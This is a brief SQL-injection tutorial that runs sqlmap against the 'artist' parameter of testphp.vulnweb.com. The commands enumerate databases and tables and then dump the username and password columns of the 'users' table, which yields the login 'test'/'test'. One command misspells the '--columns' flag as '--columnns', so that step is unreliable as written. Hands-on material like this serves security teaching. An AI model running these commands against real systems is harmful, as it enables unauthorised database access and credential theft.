Identify the vulnerable input field: In this case, the vulnerable input field is the "artist" parameter in the URL.

Use SQLMap to scan the target website: Run SQLMap against the target website by using the following command:
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
This command instructs SQLMap to scan the target URL for available databases (--dbs). SQLMap will then return a list of databases available on the server.

Identify the target database: Look for the database that contains the information you want to retrieve. In this case, you want to retrieve information from the "users" table in the "acuart" database.

Use SQLMap to dump the tables in the target database: Run SQLMap against the target database by using the following command:

sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables

This command instructs SQLMap to dump the tables (--tables) in the "acuart" database (-D acuart).

Identify the target table: Look for the "users" table in the list of dumped tables.

Use SQLMap to dump the columns  in the target table: Run SQLMap against the target table by using the following command:


sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columnns

Now we need to dump username of the login for the website we use this command 

sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump 

Now we need to dump pass of the login for the website we use this command :

sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C pass --dump 

Now we have the user name and password to login we can go to the website and try login 

The user name and password we got is "test" and "test" respectively.
